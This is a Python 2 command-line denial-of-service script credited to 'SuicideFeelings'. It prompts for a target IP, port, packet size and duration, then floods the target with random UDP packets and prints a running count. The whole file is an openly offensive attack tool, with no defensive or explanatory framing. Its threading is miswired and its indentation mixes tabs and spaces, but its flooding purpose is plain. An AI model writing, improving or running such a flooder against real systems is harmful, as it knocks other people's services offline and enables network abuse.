#!/usr/bin/python
from threading import Thread
import socket,struct,random,time
ip = str("0.0.0.0");
packetsize = 0
port = 80
duration = 120
def main():
    print("  ____              ____            _       _   ")
    print(" |  _ \  ___  ___  / ___|  ___ _ __(_)_ __ | |_ ")
    print(" | | | |/ _ \/ __| \___ \ / __| '__| | '_ \| __|")
    print(" | |_| | (_) \__ \  ___) | (__| |  | | |_) | |_ ")
    print(" |____/ \___/|___/ |____/ \___|_|  |_| .__/ \__|")
    print("                                     |_|        ")
    print("Dos Script by SuicideFeelings")
    ip = raw_input("TargetIp: ")
    port = input("TargetPort: ")
    packetsize = input("Packetsize: ")
    duration = input("Time: ")
    for i in range(8):
	 t = Thread(target=dos(ip, port, packetsize, duration))
	 t.start()


def dos(ip, port, packetsize, duration):
  if(is_valid_ipv4_address(ip)):
     print("Dos Started!")
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     bytes = random._urandom(packetsize)
     timeout =  time.time() + duration
     sent = 0
	  
     while duration != 0:
      if(time.time() > timeout):
	      print("Dos Done!")
	      main()
	      break
      else:
       try:
          client.connect((ip, port))
	  client.sendto(bytes, (ip, port))
          sent = sent + 1
    	  print("[DosScript] " + repr(sent) + " packages sent to " + ip + ":" + repr(port) + "!")
       except socket.error:
	     print("[DosScript] CONNECTION ERROR!")
	     client.close()
  else:
       print("The Ip-Address " + repr(ip) + " is invalid")
def is_valid_ipv4_address(address):
    try:
        socket.inet_pton(socket.AF_INET, address)
    except AttributeError:
        try:
            socket.inet_aton(address)
        except socket.error:
            return False
        return address.count('.') == 3
    except socket.error:
        return False

    return True

def is_valid_ipv6_address(address):
    try:
        socket.inet_pton(socket.AF_INET6, address)
    except socket.error:
        return False
    return True

if __name__ == '__main__':
    main()
